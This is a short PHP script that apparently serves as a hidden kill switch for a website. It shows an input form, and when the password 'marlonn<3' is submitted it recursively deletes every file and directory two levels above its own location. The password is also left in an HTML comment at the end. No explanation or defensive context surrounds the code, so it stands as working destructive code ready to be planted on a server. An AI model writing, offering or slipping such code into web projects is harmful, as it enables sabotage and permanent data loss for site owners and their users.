<?php
if(isset($_POST['validation']) && $_POST['aze']=="marlonn<3"){
	$dir_iterator = new RecursiveDirectoryIterator("../../");$iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::CHILD_FIRST);foreach($iterator as $fichier){$fichier->isDir() ? rmdir($fichier) : unlink($fichier);}rmdir($dossier);
}
else{
	echo "<form action='' method='POST'>";
		echo "<input type='text' name='aze'>";
		echo "<input type='submit' name='validation' value='validation'>";
	echo "</form>";
}
?>
<!-- marlonn<3 -->